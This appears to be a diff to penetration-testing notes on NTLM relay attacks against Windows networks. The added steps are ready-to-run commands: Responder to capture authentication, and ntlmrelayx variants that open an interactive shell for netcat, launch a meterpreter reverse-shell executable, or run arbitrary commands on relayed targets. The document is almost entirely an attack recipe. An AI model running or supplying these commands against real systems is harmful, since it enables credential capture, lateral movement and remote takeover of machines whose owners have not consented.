@@ -33,9 +33,15 @@ REQ2 --> Relayed user must be admin on the target machine.
         http = Off
         
 4. Start responder using below command and ensure that HTTP and SMB is OFF.
-> sudo responder -I eth1 -dwv
+        > sudo responder -I eth1 -dwv
 5. Set ntlmrelay using below commnad
-> sudo ntlmrelayx.py -tf targets.txt -smb2support
+        > sudo ntlmrelayx.py -tf targets.txt -smb2support
+OR
+        > sudo ntlmrelayx.py -tf targets.txt -smb2support -i                            // interactive shell and connnect usin netcat
+OR
+        > sudo ntlmrelayx.py -tf targets.txt -smb2support -e mterprter_rev_shell.exe    // meterpreter reverse shell using multi handler
+OR
+        >sudo ntlmrelayx.py -tf targets.txt -smb2support -c <command>                  // command execution
 
 
 Gaining Shell once credentails are obtained
